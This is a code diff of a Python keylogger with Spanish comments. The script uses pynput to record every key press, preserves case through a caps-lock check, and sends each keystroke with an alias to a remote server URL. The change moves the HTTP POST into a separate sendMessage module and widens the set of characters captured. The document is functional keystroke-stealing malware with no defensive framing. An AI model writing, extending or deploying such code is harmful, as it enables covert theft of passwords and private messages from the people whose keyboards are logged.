@@ -1,13 +1,11 @@
 from pynput import keyboard
-import requests
 import ctypes
 
 import decouple
 import sys
 from class_errors import ErrorPersonalizado
 
-import json
-import requests
+from sendMessage import sendMessage
 
 MESSAGE = ""
 
@@ -27,35 +25,7 @@ except ErrorPersonalizado as e:
 except decouple.UndefinedValueError as e:
     raise ErrorPersonalizado("La variable de entorno que intentas obtener no existe")
 
-def sendMessage():
-    global MESSAGE  # acceder a la variable global message
 
-    data = {"message": MESSAGE,"alias":alias}
-    
-
-    json_data = json.dumps(data)# Convertir el diccionario a una cadena JSON
-
-    
-    # Enviar la solicitud POST con la cadena JSON como datos
-    try:
-        response = requests.post(URL, data=json_data, headers={'Content-Type': 'application/json'})
-        response.raise_for_status()
-        if response.status_code == 200:
-            print("Pulsacion enviada correctamente")
-            print(response.json())
-
-        else:
-            print("Error en la solicitud")
-
-        MESSAGE = "" 
-    except requests.exceptions.ConnectionError as e:
-        print("Error al conectar con el servidor")
-    except requests.exceptions.HTTPError as e:
-        print("HTTP error al hacer la solicutud")
-    except requests.exceptions.RequestException as e:
-        print("Error al enviar la solcitud desde el cliente python")
-
-   
     
     
 def getUpperCaseOn(): #Funcion para saber si esta encendida la tecla de encendido
@@ -70,7 +40,7 @@ def onpress_key(key):
             char = key.char
             is_upper = getUpperCaseOn()  # Almacenamos un True o un False
 
-            if char is not None and (char.isalnum() or char in "!@#$%^&*()_+{}[];:'\"<>?,./\\|"):
+            if char is not None and (char.isalnum() or char in "!@#$%^&*()_+{}[];:'\"<>?,./\\|-_¿¡´¨"):
                 MESSAGE = char.lower() if char.isalnum() else char  # Convertimos a minúscula si es alfanumérico
                 MESSAGE = MESSAGE.upper() if is_upper else MESSAGE  # Convertimos a mayúscula si está activado el bloqueo
 
@@ -86,7 +56,8 @@ def onpress_key(key):
         elif key == keyboard.Key.enter:  # Enviamos un salto de línea cuando es enteer
             MESSAGE = "\n"
 
-        sendMessage()  # En esta función enviamos el mensaje al servidor
+        sendMessage(MESSAGE,alias,URL)  # En esta función enviamos el mensaje al servidor
+        MESSAGE = ""
 
     except AttributeError:
         print("Especial Character:", key)
